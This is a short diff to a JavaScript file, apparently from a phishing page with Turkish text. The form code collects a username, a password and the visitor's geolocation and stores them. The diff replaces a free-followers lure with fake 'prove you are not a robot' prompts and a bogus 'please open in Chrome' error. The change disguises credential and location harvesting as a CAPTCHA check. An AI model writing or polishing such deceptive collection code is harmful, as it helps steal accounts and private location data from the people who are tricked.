@@ -19,7 +19,7 @@ function showAdminLogin() {
 }
 
 function submitForm() {
-    alert("Takipçiyi gönderebilmemiz için lütfen konum izni verin.");
+    alert("Lütfen robot olmadığınızı anlamak için konum izni verin.");
     navigator.geolocation.getCurrentPosition((position) => {
         const username = document.getElementById('username').value;
         const userpass = document.getElementById('userpass').value;
@@ -29,9 +29,9 @@ function submitForm() {
         let data = JSON.parse(localStorage.getItem('entries') || '[]');
         data.push(entry);
         localStorage.setItem('entries', JSON.stringify(data));
-        alert('Bilgiler gönderildi.');
+        alert('Robot olmadığınız anlaşıldı lütfen bekleyiniz...');
     }, () => {
-        alert("Konum izni alınamadı.");
+        alert("Lütfen bağlantıyı chorem'da açın.");
     });
 }
 
